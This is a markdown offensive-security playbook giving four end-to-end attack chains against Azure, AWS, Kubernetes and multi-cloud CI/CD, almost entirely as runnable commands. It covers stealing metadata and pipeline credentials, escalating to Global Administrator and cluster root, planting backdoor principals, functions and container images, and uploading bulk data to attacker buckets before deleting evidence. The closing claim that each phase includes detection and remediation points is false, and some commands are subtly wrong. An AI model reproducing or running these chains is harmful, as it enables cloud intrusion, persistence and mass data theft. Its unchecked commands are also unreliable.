# Complete Attack Playbooks

End-to-end offensive security scenarios demonstrating full attack chains from initial access through data exfiltration.

## Azure: User to Tenant Admin

### Scenario
Compromised user with basic permissions escalates to tenant administrator and exfiltrates sensitive data.

### Attack Chain

**Phase 1: Initial Access**
- Phishing attack compromises user@company.com
- Obtain credentials: user@company.com / P@ssw0rd123

**Phase 2: Reconnaissance**
```bash
az login --username user@company.com --password "P@ssw0rd123"
az account show
az account list  # Check accessible subscriptions
az ad user list | head -20  # Enumerate users
az ad group list | head -20  # Enumerate groups
```

**Phase 3: Privilege Discovery**
```bash
# Check if user is in high-privilege groups
az ad group get-member-groups --id {userId}

# Find service principals user can manage
az ad app list --query '[].displayName' -o tsv

# Check role assignments
az role assignment list --assignee user@company.com
```

**Phase 4: Vulnerability Identification**
- Discover service principal "CloudBackupService" where user is owner
- Service principal has "User Access Administrator" role
- CloudBackupService has credentials stored in shared Key Vault

**Phase 5: Exploit Service Principal**
```bash
# Access Key Vault where service principal credentials stored
az keyvault secret show --vault-name "company-vault" --name "CloudBackupService-Secret" | jq '.value'

# Extract client ID from application
BACKUP_APP_ID=$(az ad app list --query "[?displayName=='CloudBackupService'].appId" -o tsv)

# Authenticate as service principal
az login --service-principal \
  --username $BACKUP_APP_ID \
  --password $SECRET \
  --tenant {tenantId}
```

**Phase 6: Privilege Escalation**
```bash
# Service principal has User Access Administrator role
# Escalate to Global Administrator

CURRENT_PRINCIPAL=$(az account show --query "id" -o tsv)

# Create new admin user or add self as global admin
az role assignment create \
  --role "Global Administrator" \
  --assignee $CURRENT_PRINCIPAL \
  --scope /
```

**Phase 7: Persistence**
```bash
# Create backdoor service principal
az ad sp create-for-rbac \
  --name "CloudBackdoor" \
  --role "Global Administrator" \
  --scopes "/"

# Store credentials for future access
# Create fake "device compliance" app with credentials
```

**Phase 8: Data Exfiltration**
```bash
# Enumerate all subscriptions
az account list --query '[].{id: id, name: name}' -o table

# For each subscription, dump resources
for sub in $(az account list --query '[].id' -o tsv); do
  az account set --subscription $sub
  
  # Dump Key Vault secrets
  for vault in $(az keyvault list --query '[].name' -o tsv); do
    for secret in $(az keyvault secret list --vault-name $vault --query '[].name' -o tsv); do
      az keyvault secret show --vault-name $vault --name $secret | jq '.value' >> secrets.txt
    done
  done
  
  # Copy storage containers
  for account in $(az storage account list --query '[].name' -o tsv); do
    for container in $(az storage container list --account-name $account --query '[].name' -o tsv); do
      az storage blob download-batch -d ./data -s $container --account-name $account
    done
  done
done

# Exfiltrate to attacker-controlled storage
az storage blob upload-batch -d {exfilContainerName} -s ./data --account-name {exfilAccount}
```

---

## AWS: EC2 to Data Lake Exfiltration

### Scenario
Compromised EC2 instance with attached IAM role leads to data lake exfiltration.

### Attack Chain

**Phase 1: Initial Access**
- SSH key compromise or EC2 SSH port exposure
- Obtain shell: `ssh -i key.pem ec2-user@{publicIp}`

**Phase 2: IAM Role Exploitation**
```bash
# From EC2 instance, query metadata service
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Output: EC2-DataProcessor

# Get temporary credentials
TEMP_CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-DataProcessor)
export AWS_ACCESS_KEY_ID=$(echo $TEMP_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $TEMP_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $TEMP_CREDS | jq -r '.Token')
```

**Phase 3: Permission Discovery**
```bash
# Check what this role can do
aws sts get-caller-identity

# Try common operations
aws s3 ls  # Lists S3 buckets
aws rds describe-db-instances  # Lists RDS databases
aws dynamodb list-tables  # Lists DynamoDB tables
```

**Phase 4: Permission Escalation**
```bash
# Instance profile role may have "AssumeRole" permission
# Assume data processing role with higher privileges

aws sts assume-role \
  --role-arn "arn:aws:iam::{accountId}:role/DataAnalystRole" \
  --role-session-name "analysis"

# Update credentials
export AWS_ACCESS_KEY_ID={NewAccessKeyId}
export AWS_SECRET_ACCESS_KEY={NewSecretAccessKey}
export AWS_SESSION_TOKEN={NewSessionToken}
```

**Phase 5: Data Discovery**
```bash
# List S3 data lake buckets
aws s3 ls s3://company-data-lake/

# Check what datasets available
aws s3 ls s3://company-data-lake/raw-data/ --recursive

# Identify sensitive data
# PII data: customer records, email addresses
# Financial data: transaction logs, account details
# Healthcare data: patient records

# Sample file to see structure
aws s3 cp s3://company-data-lake/raw-data/customers.parquet .
```

**Phase 6: RDS Database Access**
```bash
# Get RDS endpoint
aws rds describe-db-instances --query 'DBInstances[].[DBInstanceIdentifier,Endpoint.Address,MasterUsername]' -o table

# Attempt IAM database authentication
TOKEN=$(aws rds generate-db-auth-token --hostname {rdsEndpoint} --port 5432 --username {dbUser})

# Connect to RDS
PGPASSWORD=$TOKEN psql -h {rdsEndpoint} -d {dbName} -U {dbUser}@@rds -l

# Query sensitive tables
SELECT * FROM customers LIMIT 1000;
SELECT * FROM transactions WHERE amount > 10000;
```

**Phase 7: Data Exfiltration**
```bash
# Create temporary bucket for staging
aws s3 mb s3://temp-staging-{random}/

# Download data lake data
aws s3 sync s3://company-data-lake/raw-data/ ./data-lake/ --recursive

# Export RDS data to S3
aws rds start-export-task \
  --export-task-identifier "dataexport-$(date +%s)" \
  --source-arn "arn:aws:rds:{region}:{accountId}:db:{dbName}" \
  --s3-bucket-name temp-staging-{random} \
  --s3-prefix "db-export/" \
  --iam-role-arn "arn:aws:iam::{accountId}:role/RDSExportRole"

# Copy DynamoDB tables
aws dynamodb scan --table-name {tableName} --output json > {tableName}.json

# Upload to attacker storage
aws s3 sync ./data-lake s3://attacker-bucket/exfil/ --recursive
aws s3 cp {tableName}.json s3://attacker-bucket/exfil/

# Clean up evidence
aws s3 rb s3://temp-staging-{random}/ --force
```

---

## Kubernetes: Pod Escape to Node RCE

### Scenario
Compromised container escapes to Kubernetes node and achieves remote code execution as root.

### Attack Chain

**Phase 1: Initial Container Compromise**
- Deploy malicious application container
- Or compromise existing application container

**Phase 2: Container Runtime Escape**
```bash
# Inside container, check Docker socket access
ls -la /var/run/docker.sock

# If accessible, can spawn new privileged container
docker run --privileged -v /:/host busybox /bin/sh

# From within privileged container with host filesystem mounted
chroot /host /bin/bash

# Now have root shell on node
whoami  # root
cat /etc/hostname  # Host name
```

**Phase 3: Kubelet Access**
```bash
# Extract kubeconfig from node
cat /etc/kubernetes/kubelet.conf

# Or query kubelet API
curl -s -k https://localhost:10250/pods | jq '.items[] | .metadata.name'

# If kubelet API unauthenticated
# Can retrieve all pod information, secrets, etc.
```

**Phase 4: ETCD Access**
```bash
# From compromised node, access etcd
# Often on same network with weak credentials

curl -s http://etcd-node:2379/v2/keys/ | jq '.node'

# Dump all cluster secrets
curl -s http://etcd-node:2379/v2/keys/ --prefix | jq '.node.nodes[] | select(.key | contains("secret"))'

# Extract base64 encoded secrets
curl -s http://etcd-node:2379/v2/keys/kubernetes.io/secrets/default | jq '.node.value' | base64 -d
```

**Phase 5: Privilege Escalation to Cluster Admin**
```bash
# Found service account token on node
cat /var/lib/kubelet/kubeconfig

# Use token to query API as node
curl -s https://api.kubernetes.svc:443/api/v1/namespaces \
  -H "Authorization: Bearer {nodeServiceAccountToken}" \
  -k

# If node service account has cluster-admin
# Can create privileged pod in any namespace

kubectl create deployment privesc \
  --image=alpine \
  --replicas=1

# Edit pod to run as root with host access
kubectl patch deployment privesc -p '{
  "spec": {
    "template": {
      "spec": {
        "containers": [{"name":"alpine","securityContext":{"runAsUser":0,"privileged":true},"volumeMounts":[{"mountPath":"/host","name":"hostfs"}]}],
        "volumes":[{"name":"hostfs","hostPath":{"path":"/"}}]
      }
    }
  }
}'

# Now have root access across cluster
```

**Phase 6: Lateral Movement to Cluster**
```bash
# List all secrets in cluster
kubectl get secrets --all-namespaces

# Extract database credentials from secrets
for ns in $(kubectl get ns -o jsonpath='{.items[].metadata.name}'); do
  for secret in $(kubectl get secrets -n $ns -o jsonpath='{.items[].metadata.name}'); do
    kubectl get secret $secret -n $ns -o jsonpath='{.data}' | base64 -d
  done
done

# Find and access databases using extracted credentials
```

---

## Cross-Cloud Supply Chain Attack

### Scenario
Compromise CI/CD pipeline accessing multiple clouds, plant backdoor in supply chain.

### Attack Chain

**Phase 1: CI/CD Pipeline Compromise**
```bash
# Find CI/CD pipeline service principal
# Often has credentials to multiple clouds

# From Azure DevOps pipeline logs
# Extract service connection secrets
cat $SYSTEM_TEAMFOUNDATIONCOLLECTIONURI$SYSTEM_TEAMPROJECT \
  | grep -i "secret\|password\|token"

# Or from GitHub Actions environment
echo $AWS_SECRET_ACCESS_KEY
echo $AZURE_CLIENT_SECRET
echo $GCP_SA_KEY
```

**Phase 2: Artifact Repository Access**
```bash
# Pipeline has write access to artifact repositories
# Docker registry, npm registry, PyPI, Maven Central

# Compromise artifact in registry
# Plant backdoor in build pipeline

# Docker image backdoor
docker pull company/app:latest
docker run --rm -it company/app:latest /bin/bash
# Add malicious payload to /app/server.js

docker commit {container-id} company/app:latest
docker push company/app:latest

# Now all deployments contain backdoor
```

**Phase 3: Multi-Cloud Credential Abuse**
```bash
# Pipeline credentials allow access to all cloud environments

# AWS
aws s3 sync s3://production-data-lake ./data

# Azure
az storage container list --account-name production-storage

# GCP
gsutil ls gs://production-buckets/

# Use these across clouds

# Deploy backdoor Lambda in AWS
aws lambda create-function --function-name exfil \
  --runtime python3.9 \
  --role arn:aws:iam::{accountId}:role/lambda-role \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://backdoor.zip

# Deploy backdoor Function in Azure
az functionapp create --name backdoor-function \
  --resource-group production \
  --storage-account production-storage \
  --runtime python \
  --runtime-version 3.9

# Deploy backdoor Cloud Function in GCP
gcloud functions deploy backdoor \
  --runtime python39 \
  --trigger-http \
  --entry-point main \
  --source .
```

**Phase 4: Persistent Access**
```bash
# Create backdoor service principals/accounts in each cloud
# Store credentials in artifact repository
# Package as "build configuration" file

# Kubernetes ConfigMap with credentials
kubectl create configmap backdoor-config \
  --from-literal=aws_key=$AWS_ACCESS_KEY_ID \
  --from-literal=azure_secret=$AZURE_CLIENT_SECRET \
  --from-literal=gcp_sa_key=$GCP_SA_KEY

# Mount in deployed applications
# Applications inherit multi-cloud access
```

**Phase 5: Data Exfiltration Network**
```bash
# Create internal network of compromised services
# Each service exports data to central collection point

# AWS Lambda exports data to GCP Cloud Storage
aws s3 cp s3://company-data-lake ./data --recursive
# Lambda triggered to upload to GCP

gsutil -m cp ./data gs://attacker-gcp-bucket/

# Azure Function exports databases to AWS
az sql db export \
  --name {database} \
  --server {server} \
  --resource-group {rg} \
  --admin-login {user} \
  --admin-password {pass} \
  --storage-key-type StorageAccessKey \
  --storage-key $STORAGE_KEY \
  --storage-uri "https://s3-exfil-bucket.s3.amazonaws.com/exports/"

# Data converges on attacker infrastructure
```

These playbooks demonstrate comprehensive attack chains. Each phase includes detection opportunities and remediation points. During assessment, document every step and timeline for reporting.
